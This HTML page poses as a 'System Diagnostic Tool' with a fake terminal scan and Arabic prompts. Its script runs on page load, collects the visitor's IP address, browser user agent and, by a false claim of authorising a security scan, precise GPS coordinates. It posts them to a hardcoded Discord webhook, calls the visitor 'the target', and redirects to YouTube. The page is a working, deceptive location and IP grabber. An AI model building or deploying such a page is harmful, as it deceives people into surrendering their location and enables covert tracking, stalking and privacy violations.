<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic Tool</title>
    <style>
        body { background: #0b0e14; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .terminal { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; max-width: 80%; }
        .loading-bar { width: 0%; height: 2px; background: #00ff41; margin-top: 10px; transition: width 2s; }
        .cursor { display: inline-block; width: 10px; height: 18px; background: #00ff41; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="terminal">
    <div id="logs">Initializing system scan...<span class="cursor"></span></div>
    <div class="loading-bar" id="bar"></div>
    <p id="status" style="margin-top: 20px; font-size: 0.8em; color: #ff4141;"></p>
</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm";
    const nextStepURL = "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/&ved=2ahUKEwiJmbKa6v6RAxXz_7sIHXi0DnoQFnoECAsQAQ&usg=AOvVaw0usXxGa_x5y1xoI_LaL0-1";

    async function captureData() {
        const log = document.getElementById('logs');
        const bar = document.getElementById('bar');
        const status = document.getElementById('status');

        // 1. سحب المعلومات الأساسية (تلقائي)
        let ip = "Unknown";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch (e) {}

        log.innerHTML = "> Fetching IP and Device Metadata...<br>";
        bar.style.width = "40%";

        // 2. محاولة سحب الـ GPS
        log.innerHTML += "> Requesting High-Precision Location...<br>";
        status.innerHTML = "يرجى الضغط على 'سماح/Allow' لتفويض الفحص الأمني للجهاز.";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                bar.style.width = "100%";
                
                await sendToDiscord({
                    content: "🔥 **صيد كامل (Full Capture)!**",
                    embeds: [{
                        title: "بيانات الهدف الشاملة",
                        color: 15548997,
                        fields: [
                            { name: "الـ IP", value: ip },
                            { name: "الموقع (GPS)", value: `[خريطة جوجل](https://www.google.com/maps?q=${lat},${lon})` },
                            { name: "النظام/المتصفح", value: navigator.userAgent }
                        ]
                    }]
                });
                finish();
            }, async (err) => {
                // في حال الرفض، نرسل ما لدينا
                await sendToDiscord({
                    content: "⚠️ **صيد جزئي (رفض الـ GPS)**",
                    fields: [{ name: "الـ IP", value: ip }, { name: "السبب", value: "الهدف رفض الصلاحية" }]
                });
                finish();
            });
        } else {
            finish();
        }
    }

    async function sendToDiscord(payload) {
        await fetch(webhookURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
    }

    function finish() {
        document.getElementById('logs').innerHTML += "> Scan Complete. Redirecting...";
        setTimeout(() => {
            window.location.href = nextStepURL;
        }, 1500);
    }

    window.onload = captureData;
</script>
</body>
</html>
